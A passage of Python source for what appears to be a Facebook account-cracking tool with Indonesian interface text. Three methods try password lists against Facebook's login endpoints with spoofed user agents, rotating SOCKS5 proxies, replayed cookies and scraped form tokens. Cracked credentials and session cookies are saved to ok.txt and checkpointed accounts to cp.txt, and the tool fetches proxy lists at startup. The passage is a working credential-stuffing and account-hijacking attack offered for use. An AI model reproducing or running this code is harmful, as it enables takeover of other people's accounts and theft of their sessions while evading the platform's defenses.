       UserAgent1 = f"SAMSUNG-SM-B350E Opera/9.80 (J2ME/MIDP; Opera Mini/{str(random.randint(3,9))}.0.{str(random.randint(35000,39999))}/{str(random.randint(75,199))}.{str(random.randint(250,390))}; U; en) Presto/2.{str(random.randint(10,99))}.{str(random.randint(420,490))} Version/12.16"
       UserAgent2 = f"Opera/9.80 (MAUI Runtime; Opera Mini/4.4.39012/191.275; U; en) Presto/2.{str(random.randint(10,99))}.{str(random.randint(420,490))} Version/12.16"
       UserAgent3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(random.randint(10,16))}_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPiOS/{str(random.randint(10,99))}.0.{str(random.randint(0,99))}.{str(random.randint(111111,199999))} Mobile/{str(random.randint(10,99))}{aZ}{str(random.randint(110,190))} Safari/9537.53"
       ykhhhh = random.choice([UserAgent1, UserAgent2, UserAgent3])
       return ykhhhh

   def api(self, uid, pasw):
       prog.update(des,description=f" {P2}[ {H2}API{P2} ] {str(self.loop)}/{len(self.id)} OK-{H2}{len(self.ok)}[/] CP-{K2}{len(self.cp)}[/]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = self.DalvikUser()
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               params = {
                  "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
                  "sdk_version": {random.randint(1,26)}, 
                  "email": uid,
                  "locale": "en_US",
                  "password": pw,
                  "sdk": "android",
                  "generate_session_cookies": "1",
                  "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
               }
               headers = {
                  "Host": "graph.facebook.com",
                  "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
                  "x-fb-sim-hni": str(random.randint(20000, 40000)),
                  "x-fb-net-hni": str(random.randint(20000, 40000)),
                  "x-fb-connection-quality": "EXCELLENT",
                  "user-agent": ua,
                  "content-type": "application/x-www-form-urlencoded",
                  "x-fb-http-engine": "Liger"}
               post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
               if "session_key" in post.text and "EAA" in post.text:
                  coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                  sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookie = f"sb={sb};{coki}"
                  user = re.findall("c_user=(\d+)",cookie)[0]
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{uid}|{pw}").add(f'{H2}{cookie} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{cookie}")
                  self.ok.append(kntl)
                  with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               else:continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" {P2}[ {H2}MODPES{P2} ] {str(self.loop)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
               prog.advance(des)
               sleep(15)
       self.loop+=1

   def asyncs(self, uid, pasw):
       prog.update(des,description=f" {P2}[ {H2}ASYNC{P2} ] {str(self.loop)}/{len(self.id)} OK-{H2}{len(self.ok)}[/] CP-{K2}{len(self.cp)}[/]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = self.DalvikUser()
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               link = ses.get(f"https://m.facebook.com/login/?app_id=473039703209605&api_key=473039703209605&next=https%3A%2F%2Fm.facebook.com%2Fwa-native-ads-login%2F%3Fapp_id%3D473039703209605%26etoken%3DAbiRduD9QtHWffsEF5LGDFauUYtUoGPEvSPk1MCtRneoIlRa157eQvDol1mG-EoaP9-aP5yTpjWo5g%26client_id%3D473039703209605%26show_not_you_in_interstitial%3Dtrue&skip_api_login=1&hide_upsell=1&hide_registration=0&wtsid=rdr_0SqxNuZtyuhwlzmTH&_rdr'")
               cookies = {'dbln': '%7B%22100027083929491%22%3A%22NCsYNunW%22%2C%22100032445008663%22%3A%22ZsKiyiOW%22%2C%2261551822227693%22%3A%22u4CweN9G%22%2C%22100080589678727%22%3A%22szkGVPZL%22%2C%22100053680391698%22%3A%223xsayXQo%22%2C%2261556544167618%22%3A%2243HDCQU8%22%2C%2261557930221660%22%3A%22I1UT329o%22%2C%2261558686653656%22%3A%22FfUpAovo%22%7D','datr': 'siAdZhin5HOxqTednCQNeEKJ','sb': 'AHQeZjOPR7-SbB2hfezf2mn8','ps_n': '1','ps_l': '1','vpd': 'v1%3B1077x557x1.2932506799697876','locale': 'id_ID','wl_cbv': 'v2%3Bclient_version%3A2490%3Btimestamp%3A1714744193','m_pixel_ratio': '1.2932506799697876','wd': '558x1077','fr': '0SYMZBOf3QKhtvEPi.AWW9O6d6jwdAWA7wSAN1kzfeAt0.BmHnVB..AAA.0.0.BmNOuW.AWX2_FtpdVE'}
               headers = {'authority': 'm.facebook.com','accept': '*/*','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/login/?app_id=473039703209605&api_key=473039703209605&next=https%3A%2F%2Fm.facebook.com%2Fwa-native-ads-login%2F%3Fapp_id%3D473039703209605%26etoken%3DAbiRduD9QtHWffsEF5LGDFauUYtUoGPEvSPk1MCtRneoIlRa157eQvDol1mG-EoaP9-aP5yTpjWo5g%26client_id%3D473039703209605%26show_not_you_in_interstitial%3Dtrue&skip_api_login=1&hide_upsell=1&hide_registration=0&wtsid=rdr_0SqxNuZtyuhwlzmTH&_rdr','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"RMX3171"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','x-asbd-id': '129477','x-fb-lsd': 'AVoTMgO5Y_Y','x-requested-with': 'XMLHttpRequest','x-response-format': 'JSONStream'}
               params = {'api_key': '473039703209605','auth_token': '559ec92ed86deaca1c5d11997b8f1d5d','skip_api_login': '1','next': 'https://m.facebook.com/wa-native-ads-login/?app_id=473039703209605&etoken=AbiRduD9QtHWffsEF5LGDFauUYtUoGPEvSPk1MCtRneoIlRa157eQvDol1mG-EoaP9-aP5yTpjWo5g&client_id=473039703209605&show_not_you_in_interstitial=true','refsrc': 'deprecated','app_id': '473039703209605','lwv': '100'}
               data = {
                  "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                  "li=":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                  "try_number":0,
                  "unrecognized_tries":0,
                  "email":uid,
                  "prefill_contact_point":f"{uid} {pw}",
                  "prefill_source":"browser_dropdown",
                  "prefill_type":"password",
                  "first_prefill_source":"browser_dropdown",
                  "first_prefill_type":"contact_point",
                  "had_cp_prefilled":True,
                  "had_password_prefilled":True,
                  "is_smart_lock":False,
                  "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                  "bi_wvdp":'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                  "encpass": f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                  "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                  "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               post = requests.post('https://m.facebook.com/login/device-based/login/async/',params=params,cookies=cookies,headers=headers,data=data,allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{uid}|{pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{kuki}")
                  self.ok.append(kntl)
                  with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{K2}{uid}|{pw}").add(f'{K2}{ua}')
                    prints(tree)
                    kntl = (f"[X] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" {P2}[ {H2}MODPES{P2} ] {str(self.loop)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
               prog.advance(des)
               sleep(15)
       self.loop+=1
       
   def validateeee(self, uid, pasw):
       prog.update(des,description=f" {P2}[ {H2}T.ABF{P2} ] {str(self.loop)}/{len(self.id)} OK-{H2}{len(self.ok)}[/] CP-{K2}{len(self.cp)}[/]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = self.DalvikUser()
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=242735388861519&kid_directed_site=0&app_id=242735388861519&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D242735388861519%26redirect_uri%3Dhttps%253A%252F%252Fprimostore.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D35529ee79ebf0ef429ac11134dc86b5d%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4606dc20-c00c-4a78-af33-dd5883172fc6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fprimostore.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D35529ee79ebf0ef429ac11134dc86b5d%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
               data = {
                  "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                  "li=":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                  "try_number":0,
                  "unrecognized_tries":0,
                  "email":uid,
                  "prefill_contact_point":f"{uid} {pw}",
                  "prefill_source":"browser_dropdown",
                  "prefill_type":"password",
                  "first_prefill_source":"browser_dropdown",
                  "first_prefill_type":"contact_point",
                  "had_cp_prefilled":True,
                  "had_password_prefilled":True,
                  "is_smart_lock":False,
                  "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                  "bi_wvdp":'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                  "encpass": f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                  "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                  "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               cookies = {
                 'dbln': '%7B%22100027083929491%22%3A%22NCsYNunW%22%2C%22100032445008663%22%3A%22ZsKiyiOW%22%2C%2261551822227693%22%3A%22u4CweN9G%22%2C%22100080589678727%22%3A%22szkGVPZL%22%2C%22100053680391698%22%3A%223xsayXQo%22%2C%2261556544167618%22%3A%2243HDCQU8%22%2C%2261555537283103%22%3A%224UN4mYRK%22%2C%2261557930221660%22%3A%2202Z4U1tb%22%7D',
                 'datr': '78r1ZYQSKv9sueT-MycL3UEB',
                 'sb': 'iYz2Zbm7baebiXjpF8k3G3Mb',
                 'ps_n': '0',
                 'ps_l': '0',
                 'dpr': '1.2932506799697876',
                 'locale': 'id_ID',
                 'm_pixel_ratio': '1.2932506799697876',
                 'wl_cbv': 'v2%3Bclient_version%3A2464%3Btimestamp%3A1712771886',
                 'vpd': 'v1%3B969x501x1.2932506799697876',
                 'wd': '558x1077',
                 'fr': '0U42WtXKqWai6CkRY.AWVpokS41ntjcX4uX_O-_oHjl14.Bl9cr6..AAA.0.0.BmFtNX.AWWgo4XUEhw',
               }
               headers = {
                 'authority': 'm.facebook.com',
                 'accept': '*/*',
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                 'content-type': 'application/x-www-form-urlencoded',
                 'dpr': '1.29325',
                 'origin': 'https://m.facebook.com',
                 'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=242735388861519&kid_directed_site=0&app_id=242735388861519&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D242735388861519%26redirect_uri%3Dhttps%253A%252F%252Fprimostore.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D35529ee79ebf0ef429ac11134dc86b5d%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4606dc20-c00c-4a78-af33-dd5883172fc6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fprimostore.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D35529ee79ebf0ef429ac11134dc86b5d%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                 'sec-ch-prefers-color-scheme': 'dark',
                 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                 'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-model': '"RMX3171"',
                 'sec-ch-ua-platform': '"Android"',
                 'sec-ch-ua-platform-version': '"11.0.0"',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
                 'user-agent': ua,
                 'viewport-width': '557',
                 'x-asbd-id': '129477',
                 'x-fb-lsd': 'AVrOEfQ1P1U',
                 'x-requested-with': 'XMLHttpRequest',
                 'x-response-format': 'JSONStream',
               }
               params = {
                 'api_key': '242735388861519',
                 'auth_token': 'e1f8ac062b403692df7c9a3ef91e8d56',
                 'skip_api_login': '1',
                 'signed_next': '1',
                 'next': 'https://m.facebook.com/v19.0/dialog/oauth?response_type=code&client_id=242735388861519&redirect_uri=https%3A%2F%2Fprimostore.net%2Fwp-login.php%3FloginSocial%3Dfacebook&state=35529ee79ebf0ef429ac11134dc86b5d&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=4606dc20-c00c-4a78-af33-dd5883172fc6&tp=unspecified',
                 'refsrc': 'deprecated',
                 'app_id': '242735388861519',
                 'cancel': 'https://primostore.net/wp-login.php?loginSocial=facebook&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=35529ee79ebf0ef429ac11134dc86b5d#_=_',
                 'lwv': '100',
               }
               response = ses.post('https://m.facebook.com/login/device-based/login/async/',params=params,cookies=cookies,headers=headers,data=data,allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{uid}|{pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{kuki}")
                  self.ok.append(kntl)
                  with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{K2}{uid}|{pw}").add(f'{K2}{ua}')
                    prints(tree)
                    kntl = (f"[X] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" {P2}[ {H2}MODPES{P2} ] {str(self.loop)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
               prog.advance(des)
               sleep(15)
       self.loop+=1

#-* Trigger *-#
if __name__=='__main__':
  try:
      proxy = requests.Session().get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all")
      open('data/proxies.txt','w').write(proxy.text)
      os.system("git pull") ; Facebook().Menuuu()
  except requests.exceptions.ConnectionError as e:
      prints(Panel(f'''{P2}koneksi kamu terganggu pastikan terhubung dengan internet ya''',subtitle="╭───", subtitle_align="left",width=80,padding=(0,4),style=f"pale_violet_red1"))
      Console().input(f"   {V2}╰─( {H2}enter {P2}untuk melanjutkan{V2} ) ") ; Facebook().Menuuu()
